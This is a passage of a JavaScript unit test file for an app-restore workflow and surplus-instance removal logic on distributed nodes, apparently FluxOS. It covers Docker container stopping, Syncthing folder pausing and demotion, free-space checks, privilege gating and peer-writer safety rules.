        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
        sinon.assert.notCalled(IOUtils.untarFile);
      });

      it('does not touch appdata when the archive holds nothing', async () => {
        IOUtils.inspectTarGz.resolves({ status: true, entries: 0, bytes: 0 });

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result).to.equal(false);
        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
      });

      it('does not touch appdata when the download arrived short', async () => {
        IOUtils.getRemoteFileSize.resolves(18 * 1024 * 1024);
        IOUtils.getFileSize.resolves(4 * 1024 * 1024);

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result).to.equal(false);
        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
        sinon.assert.notCalled(IOUtils.untarFile);
      });

      it('reads the archive before it clears appdata, not after', async () => {
        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.callOrder(
          IOUtils.inspectTarGz,
          IOUtils.removeDirectory.withArgs(`${mount}/appdata`, true),
          IOUtils.untarFile,
        );
      });

      it('refuses when the archive cannot fit in the room clearing appdata frees', async () => {
        IOUtils.getVolumeInfo.resolves({ error: null, mounts: [{ mount, available: 2 * 1024 * 1024 * 1024 }] });
        IOUtils.getDirectorySizeBytes.resolves(1 * 1024 * 1024 * 1024);
        IOUtils.inspectTarGz.resolves({ status: true, entries: 10, bytes: 30 * 1024 * 1024 * 1024 });

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result).to.equal(false);
        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
      });

      it('measures free space after the download, not before it', async () => {
        // a remote restore writes the archive into the same volume it is about
        // to extract into, so free space read before the download over-states
        // the room by the size of the archive itself
        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.callOrder(
          IOUtils.downloadFileFromUrl,
          IOUtils.getVolumeInfo.withArgs(appname, 'palworld', 'B', 0, 'available'),
          IOUtils.removeDirectory.withArgs(`${mount}/appdata`, true),
        );
      });

      it('refuses when the volume is not mounted rather than failing on undefined', async () => {
        // df only reports mounted filesystems, so an empty mounts array is the
        // shape an unmounted volume takes. Asserting the message matters:
        // reading [0].mount off it also ends the restore, but as a TypeError.
        const res = makeRes();
        IOUtils.getVolumeInfo.resolves({ error: null, mounts: [] });

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), res);

        expect(result).to.equal(false);
        sinon.assert.notCalled(IOUtils.untarFile);
        sinon.assert.calledWithMatch(res.write, /volume is not mounted/);
      });

      it('refuses distinctly when the mount table cannot be read, not as "not mounted"', async () => {
        // A failure to read the mount table is not a verdict that the volume is
        // absent - restore is destructive, so it refuses on the unknown rather
        // than clearing data it could not confirm the location of.
        const res = makeRes();
        IOUtils.getVolumeInfo.resolves({ error: new Error('cannot read mounts'), mounts: [] });

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), res);

        expect(result).to.equal(false);
        sinon.assert.notCalled(IOUtils.untarFile);
        sinon.assert.calledWithMatch(res.write, /could not be read/);
      });
    });

    describe('the other instances', () => {
      it('never asks a peer to redeploy', async () => {
        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.neverCalledWith(appController.executeAppGlobalCommand, appname, 'redeploy');
      });

      it('leaves a g: app alone - the other instances are stopped and syncthing carries it', async () => {
        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.notCalled(appController.executeAppGlobalCommand);
      });

      it('restarts the peers of an s: component, whose containers are all running', async () => {
        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.calledWithExactly(appController.executeAppGlobalCommand, appname, 'apprestart', 'auth', undefined, true);
      });

      it('leaves an unsynced app alone entirely - no peer holds its data', async () => {
        registryManager.getApplicationGlobalSpecifications.resolves(specWith('/data'));
        registryManager.getApplicationSpecifications.resolves(specWith('/data'));

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.notCalled(appController.executeAppGlobalCommand);
        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { paused: true }, folderId);
      });

      it('does not fan out when the restore failed', async () => {
        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));
        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.notCalled(appController.executeAppGlobalCommand);
      });
    });

    describe('the syncthing folder', () => {
      it('pauses the folder per component and never deletes it', async () => {
        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: true }, folderId);
        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'delete');
      });

      it('leaves the folder paused when a failed restore cannot demote it', async () => {
        // The folder holds partial data. Demoted it heals from the peers;
        // resumed while still sendreceive it hands the deletions and the
        // wreckage to every healthy peer. So a demotion that did not happen
        // must keep the folder out of the resume.
        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
        syncthingService.adjustConfigFolders
          .withArgs('patch', { type: 'receiveonly' }, folderId)
          .resolves({
            status: 'error',
            data: {
              message: 'Request failed with status code 500', name: 'AxiosError', code: 'ERR_BAD_RESPONSE', httpStatus: 500,
            },
          });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
        // the healing marks still go on: they are what the machinery needs
        // if the demotion lands on a later pass
        expect(globalState.receiveOnlySyncthingAppsCache.get(folderId)).to.deep.equal({
          restarted: false,
          numberOfExecutions: 0,
        });
        sinon.assert.calledWithExactly(appReconciler.setControllerDesired, folderId, 'stopped', 'restore did not complete');
      });

      it('demotes a failed restore straight at the folder id, then resumes it', async () => {
        // The demotion is patched directly, with no config pre-read: a safety
        // action must not be conditioned on a fallible read whose failure
        // silently reads as "nothing to protect". Demoted, the resumed folder
        // is receiveonly - it heals from the peers instead of feeding them.
        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { type: 'receiveonly' }, folderId);
        sinon.assert.notCalled(syncthingService.getConfigFolders);
        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
      });

      it('refuses before clearing anything when a container will not stop', async () => {
        // appdata lives on a volume the container is still writing to. Clearing
        // it under a live container leaves the app writing into a half-emptied
        // tree, and able to save its own state back over what the archive puts
        // there - the same shape as the loss, contained to this node.
        dockerService.dockerContainerInspect.resolves({ State: { Running: true } });

        const res = makeRes();
        await advancedWorkflows.appendRestoreTask(restoreReq(), res);

        sinon.assert.notCalled(IOUtils.removeDirectory);
        sinon.assert.notCalled(IOUtils.untarFile);
        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Refused: .*could not be stopped/);
      });

      it('reads the container back rather than trusting the stop call', async () => {
        // a stop that returned is not a container that is down
        dockerService.appDockerStop.resolves('Flux App successfully stopped.');
        dockerService.dockerContainerInspect.resolves({ State: { Running: true } });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.called(dockerService.dockerContainerInspect);
        sinon.assert.notCalled(IOUtils.removeDirectory);
      });

      it('stops every component even when one of them fails', async () => {
        // the catch used to sit outside the loop, so the first failure skipped
        // every component after it - and the caller saw nothing
        registryManager.getApplicationSpecifications.resolves({
          version: 8,
          name: appname,
          compose: [
            { name: 'alpha', containerData: 's:/data' },
            { name: 'beta', containerData: 's:/data' },
          ],
        });
        dockerService.appDockerStop.withArgs(`alpha_${appname}`).rejects(new Error('docker busy'));

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.calledWith(dockerService.appDockerStop, `alpha_${appname}`);
        sinon.assert.calledWith(dockerService.appDockerStop, `beta_${appname}`);
      });

      it('waits for a daemon that is mid-restart rather than reading silence as running', async () => {
        // A dockerd restart is exactly what suite 44 fires at a live backup. The
        // inspect and the list both fail while it is down; neither says the
        // container is up, and giving up here would release the operation's
        // lease and hand the app back to the reconciler mid-flight.
        const down = new Error('connect ENOENT /var/run/docker.sock');
        dockerService.dockerContainerInspect.onCall(0).rejects(down);
        dockerService.dockerListContainers.onCall(0).rejects(down);
        dockerService.dockerContainerInspect.resolves({ State: { Running: false } });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.called(IOUtils.untarFile);
      });

      it('refuses on a daemon that never answers, and says that is what happened', async () => {
        const down = new Error('connect ENOENT /var/run/docker.sock');
        dockerService.dockerContainerInspect.rejects(down);
        dockerService.dockerListContainers.rejects(down);

        const res = makeRes();
        await advancedWorkflows.appendRestoreTask(restoreReq(), res);

        sinon.assert.notCalled(IOUtils.removeDirectory);
        sinon.assert.notCalled(IOUtils.untarFile);
        // the operator is told the daemon did not answer - not that the
        // container refused to stop, which was never established
        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Refused: docker is not answering/);
      });

      it('tells a container that is gone from a daemon that cannot answer', async () => {
        // both arrive as an inspect failure; only the list tells them apart, and
        // only one of them is a reason to refuse
        const err = new Error('No such container');
        dockerService.dockerContainerInspect.rejects(err);
        dockerService.dockerListContainers.resolves([]);

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.called(IOUtils.untarFile);
      });

      it('refuses while the container exists but its run state cannot be read', async () => {
        // docker is up and lists the container, but the inspect keeps failing:
        // it exists and we do not know whether it is running. That is not
        // "stopped" - destroying its data on the strength of it is exactly what
        // reading an unknown as an answer costs.
        sinon.stub(dockerService, 'getAppDockerNameIdentifier').returns('/fluxpalworld_x');
        dockerService.dockerContainerInspect.rejects(new Error('EOF'));
        dockerService.dockerListContainers.resolves([{ Names: ['/fluxpalworld_x'] }]);

        const res = makeRes();
        await advancedWorkflows.appendRestoreTask(restoreReq(), res);

        sinon.assert.notCalled(IOUtils.removeDirectory);
        sinon.assert.notCalled(IOUtils.untarFile);
        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Refused: docker is not answering/);
      });

      it('waits for the daemon once, not once per component', async () => {
        // The daemon is a property of the node. Waiting it out per component
        // multiplies the refusal's latency by the compose count - five minutes
        // on a five-component app, which outlives the suite that would catch it.
        registryManager.getApplicationSpecifications.resolves({
          version: 8,
          name: appname,
          compose: [
            { name: 'alpha', containerData: 's:/data' },
            { name: 'beta', containerData: 's:/data' },
            { name: 'gamma', containerData: 's:/data' },
          ],
        });
        const down = new Error('connect ENOENT /var/run/docker.sock');
        dockerService.dockerContainerInspect.rejects(down);
        dockerService.dockerListContainers.rejects(down);

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        // one component's worth of probing, then it gives up for the node
        const probes = dockerService.dockerListContainers.callCount;
        expect(probes, `probed ${probes} times - should stop after one component`).to.be.at.most(12);
        sinon.assert.notCalled(IOUtils.untarFile);
      });

      it('says what it is waiting for, so a held stream is not silent', async () => {
        // the response has already returned 200; a minute of nothing is a minute
        // in which anything in front of it may call the connection idle
        const down = new Error('connect ENOENT /var/run/docker.sock');
        dockerService.dockerContainerInspect.onCall(0).rejects(down);
        dockerService.dockerListContainers.onCall(0).rejects(down);
        dockerService.dockerContainerInspect.resolves({ State: { Running: false } });

        const res = makeRes();
        await advancedWorkflows.appendRestoreTask(restoreReq(), res);

        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Docker is not answering .* waiting/);
      });

      it('refuses before clearing anything when the folder cannot be held still', async () => {
        // The folder path is the mount ROOT, so appdata is inside the replicated
        // scope: clearing it under a folder that is still sendreceive turns the
        // clear into deletions this node broadcasts to every healthy peer. That
        // is the quiet half of the 2026-08-04 loss, with no redeploy involved.
        // A transient failure cannot tell us the folder is held, so nothing may
        // be destroyed on the strength of it.
        syncthingService.adjustConfigFolders
          .withArgs('patch', { paused: true }, folderId)
          .resolves({ status: 'error', data: { code: 'ECONNREFUSED', message: 'socket hang up' } });

        const res = makeRes();
        await advancedWorkflows.appendRestoreTask(restoreReq(), res);

        sinon.assert.notCalled(IOUtils.removeDirectory);
        sinon.assert.notCalled(IOUtils.untarFile);
        // the UI never checks HTTP status, so the refusal has to be legible in
        // the stream itself, and leading - the restore caption truncates at 50
        expect(res.write.getCalls().map((c) => c.args[0]).join('')).to.match(/Refused: .*could not be held still/);
        expect(globalState.restoreInProgress).to.not.include(appname);
      });

      it('proceeds when syncthing has no such folder, because nothing is replicating it', async () => {
        // A 4xx is an answer, not a failure: syncthing does not know the folder,
        // so there is nothing to hold still and nothing to broadcast.
        syncthingService.adjustConfigFolders
          .withArgs('patch', { paused: true }, folderId)
          .resolves({ status: 'error', data: { code: 'ERR_BAD_REQUEST', message: 'Request failed with status code 404', httpStatus: 404 } });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.called(IOUtils.untarFile);
        // never resumed, because it was never held
        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
      });

      it('resumes the folder when the restore fails', async () => {
        IOUtils.inspectTarGz.resolves({ status: false, error: 'gzip: unexpected end of file' });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
        expect(globalState.restoreInProgress).to.not.include(appname);
      });

      it('marks the restored copy settled so the peers take it', async () => {
        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(globalState.receiveOnlySyncthingAppsCache.get(folderId)).to.include({ restarted: true });
      });

      it('holds a half-written copy out of sync instead of broadcasting it', async () => {
        // the unpack failed with appdata already cleared, so what is on disk is
        // neither copy. Demoted, held, and marked NOT settled - a settled entry
        // sends the folder state machine down the path that starts the
        // container on exactly this partial data
        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result).to.equal(false);
        sinon.assert.calledWith(syncthingService.adjustConfigFolders, 'patch', { type: 'receiveonly' });
        expect(globalState.receiveOnlySyncthingAppsCache.get(folderId)).to.include({ restarted: false });
        sinon.assert.calledWith(appReconciler.setControllerDesired, folderId, 'stopped');
      });

      it('holds an unsynced component too, which has no peer to be put right by', async () => {
        // The demotion means nothing without a folder, but the hold does. A
        // component that syncs can be repaired by its peers, so holding it costs
        // it minutes; one that does not sync has no repair path at all, and an
        // app restarted on a half-replaced directory writes fresh state over the
        // wreckage - after which even a good archive lands on top of that.
        registryManager.getApplicationGlobalSpecifications.resolves(specWith('/data'));
        registryManager.getApplicationSpecifications.resolves(specWith('/data'));
        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result).to.equal(false);
        sinon.assert.calledWith(appReconciler.setControllerDesired, folderId, 'stopped');
        // nothing to demote, so nothing is demoted
        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { type: 'receiveonly' }, folderId);
      });

      it('leaves a component that restored cleanly alone when a later one fails', async () => {
        registryManager.getApplicationGlobalSpecifications.resolves({
          version: 8,
          name: appname,
          compose: [
            { name: 'palworld', containerData: 'g:/palworld/Pal/Saved' },
            { name: 'mods', containerData: 'g:/mods' },
          ],
        });
        const req = restoreReq();
        req.body.restore = [
          { component: 'palworld', restore: true, url: 'https://example.invalid/a.tar.gz' },
          { component: 'mods', restore: true, url: 'https://example.invalid/b.tar.gz' },
        ];
        IOUtils.untarFile.onFirstCall().resolves({ status: true });
        IOUtils.untarFile.onSecondCall().resolves({ status: false, error: 'no space left on device' });

        await advancedWorkflows.appendRestoreTask(req, makeRes());

        // only the one that was mid-replacement is demoted
        sinon.assert.neverCalledWith(appReconciler.setControllerDesired, folderId, 'stopped');
        sinon.assert.calledWith(appReconciler.setControllerDesired, `fluxmods_${appname}`, 'stopped');
      });
    });

    describe('the archive', () => {
      it('removes the copy it downloaded only once the app is back up', async () => {
        // deleting it the moment the unpack returned - before the app had been
        // started - threw away the one thing a failure could be retried from
        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.calledWithExactly(IOUtils.removeFile, `${mount}/backup/remote/backup_palworld.tar.gz`);
        sinon.assert.callOrder(IOUtils.untarFile, dockerService.appDockerStart, IOUtils.removeFile);
      });

      it('keeps an uploaded archive - it is the owner\'s copy, not ours', async () => {
        const req = restoreReq({ type: 'upload' });
        req.body.restore = [{ component: 'palworld', restore: true }];

        await advancedWorkflows.appendRestoreTask(req, makeRes());

        sinon.assert.notCalled(IOUtils.removeFile);
      });

      it('keeps the downloaded archive when the restore failed, so it can be retried', async () => {
        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.notCalled(IOUtils.removeFile);
      });
    });

    describe('where the restore runs', () => {
      it('refuses a g: restore on an instance that is not the one FDM points at', async () => {
        fdmNames('9.9.9.9:16127');

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result).to.equal(false);
        sinon.assert.notCalled(dockerService.appDockerStop);
        sinon.assert.notCalled(IOUtils.untarFile);
      });

      it('proceeds on a different instance when force is given', async () => {
        fdmNames('9.9.9.9:16127');

        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ force: true }), makeRes());

        expect(result).to.equal(true);
        sinon.assert.called(IOUtils.untarFile);
      });

      it('proceeds when FDM cannot be reached - an unreachable FDM must not block a restore', async () => {
        serviceHelper.axiosGet.rejects(new Error('ECONNREFUSED'));

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result).to.equal(true);
        sinon.assert.called(IOUtils.untarFile);
      });

      it('does not consult FDM for a component with no elected writer', async () => {
        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));

        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.notCalled(serviceHelper.axiosGet);
      });

      // A bare app name fans out to every component on the way down AND on the
      // way back up, so this task can start an elected component the election
      // placed elsewhere - and the folders are back in sendreceive by then, so it
      // writes into live replicated storage at once. It may start one only where
      // FDM said the primary is here.
      it('starts the elected component when FDM confirms this node is the primary', async () => {
        // the default stub answers with this node's own address
        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        sinon.assert.calledWith(dockerService.appDockerStart, `palworld_${appname}`);
      });

      it('leaves the elected component to the election when FDM cannot be reached', async () => {
        serviceHelper.axiosGet.rejects(new Error('ECONNREFUSED'));

        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());

        expect(result, 'the restore itself still runs - silence must not block one').to.equal(true);
        sinon.assert.called(IOUtils.untarFile);
        sinon.assert.neverCalledWith(dockerService.appDockerStart, `palworld_${appname}`);
      });

      it('leaves the elected component to the election when force skipped the check', async () => {
        fdmNames('9.9.9.9:16127');

        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ force: true }), makeRes());

        expect(result).to.equal(true);
        sinon.assert.neverCalledWith(dockerService.appDockerStart, `palworld_${appname}`);
      });

      // The collateral case, and the one that needs no FDM failure at all: an
      // elected component that is not a target of this restore is stopped by the
      // fan-out anyway. Nothing consults FDM, because no TARGET is elected - so
      // the primary is unknown and that component is not this task's to start.
      // The rest of the app still comes back, or this test would pass on a
      // restore that started nothing.
      it('does not start an elected component that was never part of the restore', async () => {
        const twoComponents = {
          version: 8,
          name: appname,
          compose: [
            { name: 'palworld', containerData: 'g:/palworld/Pal/Saved' },
            { name: 'sidecar', containerData: '/data' },
          ],
        };
        registryManager.getApplicationGlobalSpecifications.resolves(twoComponents);
        registryManager.getApplicationSpecifications.resolves(twoComponents);
        const req = restoreReq();
        req.body.restore = [
          { component: 'palworld', restore: false, url: '' },
          { component: 'sidecar', restore: true, url: 'https://example.invalid/backup_sidecar.tar.gz' },
        ];

        const result = await advancedWorkflows.appendRestoreTask(req, makeRes());

        expect(result).to.equal(true);
        sinon.assert.calledWith(dockerService.appDockerStart, `sidecar_${appname}`);
        sinon.assert.neverCalledWith(dockerService.appDockerStart, `palworld_${appname}`);
      });
    });

    it('restores a legacy app, which addresses its single volume as null', async () => {
      const legacy = { version: 3, name: appname, containerData: 'g:/data' };
      registryManager.getApplicationGlobalSpecifications.resolves(legacy);
      registryManager.getApplicationSpecifications.resolves(legacy);
      const req = restoreReq();
      req.body.restore = [{ component: 'null', restore: true, url: 'https://example.invalid/a.tar.gz' }];

      const result = await advancedWorkflows.appendRestoreTask(req, makeRes());

      expect(result).to.equal(true);
      sinon.assert.calledWith(IOUtils.getVolumeInfo, appname, 'null');
    });

    // appownerorfluxteam admits the app's owner and the flux team, and refuses the
    // node operator - so the string this asks for is the whole of the policy. A
    // restore overwrites a customer's volume from an archive the caller names,
    // which makes it the most destructive of the file verbs, not the mildest.
    it('gates a restore on the privilege that refuses the node operator', async () => {
      verificationHelper.verifyPrivilege.resolves(false);
      const req = restoreReq();

      await advancedWorkflows.appendRestoreTask(req, makeRes());

      sinon.assert.calledOnceWithExactly(verificationHelper.verifyPrivilege, Privilege.APP_OWNER_OR_FLUX_TEAM, authOf(req), { appName: appname });
      sinon.assert.notCalled(IOUtils.getVolumeInfo);
    });
  });

  // Note: verifyAppUpdateParameters, getPeerAppsInstallingErrorMessages, and
  // stopSyncthingApp are complex integration functions or HTTP request handlers
  // that require extensive mocking of database connections, HTTP requests, and
  // external services. These should be tested in integration tests rather than
  // unit tests. masterSlaveApps is included above with basic tests, but full
  // integration testing is recommended for comprehensive coverage of the
  // master-slave coordination logic.
});

describe('giving up an app: one pass, two reasons, one safety gate', () => {
  const generalService = require('../../ZelBack/src/services/generalService');
  const fluxNetworkHelper = require('../../ZelBack/src/services/fluxNetworkHelper');
  const registryManager = require('../../ZelBack/src/services/appDatabase/registryManager');
  const appUninstaller = require('../../ZelBack/src/services/appLifecycle/appUninstaller');
  const evacuationSafety = require('../../ZelBack/src/services/appLifecycle/appEvacuationSafety');
  const residentialNodeDosService = require('../../ZelBack/src/services/residentialNodeDosService');

  const LOCAL = '1.2.3.4:16127';

  function locations(...ips) {
    return ips.map((ip, index) => ({ ip, runningSince: new Date(1700000000000 + index) }));
  }

  function installed(...names) {
    return names.map((name) => ({ name, instances: 3 }));
  }

  beforeEach(() => {
    sinon.stub(generalService, 'checkSynced').resolves(true);
    sinon.stub(fluxNetworkHelper, 'getLocalSocketAddress').resolves(LOCAL);
    sinon.stub(appUninstaller, 'removeAppLocally').resolves();
    sinon.stub(registryManager, 'appLocation');
    sinon.stub(registryManager, 'getApplicationGlobalSpecifications').resolves({ name: 'a', version: 8 });
    sinon.stub(evacuationSafety, 'canSafelyRemoveApp').resolves({ safe: true, reason: 'peer holds it' });
    sinon.stub(residentialNodeDosService, 'isEvacuating').returns(false);
    sinon.stub(residentialNodeDosService, 'mayEvacuateApp').returns({ ok: true, reason: 'ready' });
    sinon.stub(residentialNodeDosService, 'noteEvacuated');
    sinon.stub(residentialNodeDosService, 'forgetAppObservation');

    const db = { db: () => ({}) };
    sinon.stub(dbHelper, 'databaseConnection').returns(db);
    sinon.stub(dbHelper, 'findInDatabase').resolves(installed('appone'));
  });

  afterEach(() => {
    sinon.restore();
  });

  describe('reasonToGiveUpApp', () => {
    it('names SURPLUS when this node holds the junior of too many instances', async () => {
      // Three running against an instance count of two, and this node started
      // last, so it is the one that stands aside.
      const decision = await advancedWorkflows.reasonToGiveUpApp(
        { name: 'a', instances: 2 },
        locations('5.6.7.8:16127', '9.9.9.9:16127', LOCAL),
        LOCAL,
      );

      expect(decision.giveUp).to.equal(true);
      expect(decision.reason).to.equal('SURPLUS');
    });

    it('does not name SURPLUS when this node holds a senior instance', async () => {
      const decision = await advancedWorkflows.reasonToGiveUpApp(
        { name: 'a', instances: 2 },
        locations(LOCAL, '5.6.7.8:16127', '9.9.9.9:16127'),
        LOCAL,
      );

      expect(decision.giveUp).to.equal(false);
    });

    it('names nothing when the app is at its instance count and the node is not evacuating', async () => {
      const decision = await advancedWorkflows.reasonToGiveUpApp(
        { name: 'a', instances: 2 },
        locations(LOCAL, '5.6.7.8:16127'),
        LOCAL,
      );

      expect(decision.giveUp).to.equal(false);
      expect(decision.reason).to.equal('NONE');
    });

    it('names EVACUATION when the node is evacuating and this app\'s turn has come', async () => {
      residentialNodeDosService.isEvacuating.returns(true);

      const decision = await advancedWorkflows.reasonToGiveUpApp(
        { name: 'a', instances: 2 },
        locations(LOCAL, '5.6.7.8:16127'),
        LOCAL,
      );

      expect(decision.giveUp).to.equal(true);
      expect(decision.reason).to.equal('EVACUATION');
    });

    it('defers to the pacing when the app\'s turn has not come', async () => {
      residentialNodeDosService.isEvacuating.returns(true);
      residentialNodeDosService.mayEvacuateApp.returns({ ok: false, reason: 'its turn is in 20m' });

      const decision = await advancedWorkflows.reasonToGiveUpApp(
        { name: 'a', instances: 2 },
        locations(LOCAL, '5.6.7.8:16127'),
        LOCAL,
      );

      expect(decision.giveUp).to.equal(false);
      expect(decision.detail).to.contain('20m');
    });

    // A g: app: one component runs on a single node at a time and writes to the
    // volume. `w_a` is what the election keys on and what the container is named.
    const withWriter = { name: 'a', instances: 2, version: 8, compose: [{ name: 'w', containerData: 'g:/data' }] };
    const writerAppId = require('../../ZelBack/src/services/dockerService').getAppIdentifier('w_a');

    // The peer probe. A status IS an answer - the peer is alive and merely
    // cannot say - so it reads as "cannot be ruled out", never as clearance.
    const newestSays = ({ held = null, status = null }) => sinon.stub(axios, 'get').callsFake((url) => {
      if (status) return Promise.reject(Object.assign(new Error(`status ${status}`), { response: { status } }));
      if (url.includes('/apps/heldcomponents')) return Promise.resolve({ data: { data: held } });
      return Promise.resolve({ data: { data: [] } });
    });

    it('leaves the newest copy alone when it is the one writing', async () => {
      // "The newest stands aside" stands in for "the least valuable copy stands
      // aside". The writer is the most valuable copy there is, so the stand-in
      // is backwards here and the node stays.
      const decision = await advancedWorkflows.reasonToGiveUpApp(
        withWriter,
        locations('5.6.7.8:16127', '9.9.9.9:16127', LOCAL),
        LOCAL,
        { isComponentRunningLocally: sinon.stub().resolves(true), liveness: {} },
      );

      expect(decision.giveUp).to.equal(false);
      expect(decision.reason).to.equal('SURPLUS');
      expect(decision.detail).to.contain('w_a');
    });

    it('still trims the newest copy when it is not the one writing', async () => {
      const decision = await advancedWorkflows.reasonToGiveUpApp(
        withWriter,
        locations('5.6.7.8:16127', '9.9.9.9:16127', LOCAL),
        LOCAL,
        { isComponentRunningLocally: sinon.stub().resolves(false), liveness: {} },
      );

      expect(decision.giveUp).to.equal(true);
      expect(decision.reason).to.equal('SURPLUS');
    });

    it('trims the second-newest once the newest confirms it holds the writer', async () => {
      newestSays({ held: [writerAppId] });

      // LOCAL is second of three here: 9.9.9.9 started last.
      const decision = await advancedWorkflows.reasonToGiveUpApp(
        withWriter,
        locations('5.6.7.8:16127', LOCAL, '9.9.9.9:16127'),
        LOCAL,
        { isComponentRunningLocally: sinon.stub().resolves(false), liveness: {} },
      );

      expect(decision.giveUp).to.equal(true);
      expect(decision.reason).to.equal('SURPLUS');
      expect(decision.detail).to.contain('w_a');
    });

    it('does not trim the second-newest when the newest cannot be ruled out', async () => {
      // THE ONE THAT MATTERS. Every node ranks the same shared order, but "who
      // is writing" is each node's own reading, and FDM lags it. A second node
      // acting on anything less than a positive confirmation is how two copies
      // leave at once. Alive-and-cannot-say must read as "do nothing".
      newestSays({ status: 500 });

      const decision = await advancedWorkflows.reasonToGiveUpApp(
        withWriter,
        locations('5.6.7.8:16127', LOCAL, '9.9.9.9:16127'),
        LOCAL,
        { isComponentRunningLocally: sinon.stub().resolves(false), liveness: {} },
      );

      expect(decision.giveUp).to.equal(false);
    });

    it('does not trim the second-newest when the newest says it is not writing', async () => {
      // Then the newest is an ordinary surplus copy and trims itself. Two nodes
      // acting on that same fact is exactly what must not happen.
      newestSays({ held: [] });

      const decision = await advancedWorkflows.reasonToGiveUpApp(
        withWriter,
        locations('5.6.7.8:16127', LOCAL, '9.9.9.9:16127'),
        LOCAL,
        { isComponentRunningLocally: sinon.stub().resolves(false), liveness: {} },
      );

      expect(decision.giveUp).to.equal(false);
    });

    it('asks no peer anything for an app with no writer', async () => {
      // Nothing to protect and nothing to ask. LOCAL is SECOND-newest here, so
      // this sits exactly where the probe would fire if the rule stopped
      // requiring a writer - a position-0 node would never reach that branch
      // and the test would pass with the guard deleted.
      const probe = sinon.stub(axios, 'get').rejects(new Error('no peer should be probed'));

      const decision = await advancedWorkflows.reasonToGiveUpApp(
        { name: 'a', instances: 2, version: 8, compose: [{ name: 'w', containerData: '/data' }] },
        locations('5.6.7.8:16127', LOCAL, '9.9.9.9:16127'),
        LOCAL,
        { isComponentRunningLocally: sinon.stub().resolves(true), liveness: {} },
      );

      expect(decision.giveUp).to.equal(false);
      sinon.assert.notCalled(probe);
    });

    it('asks no peer anything when there is no surplus', async () => {
      const probe = sinon.stub(axios, 'get').rejects(new Error('no peer should be probed'));

      const decision = await advancedWorkflows.reasonToGiveUpApp(
        withWriter,
        locations('5.6.7.8:16127', LOCAL),
        LOCAL,
        { isComponentRunningLocally: sinon.stub().resolves(true), liveness: {} },
      );

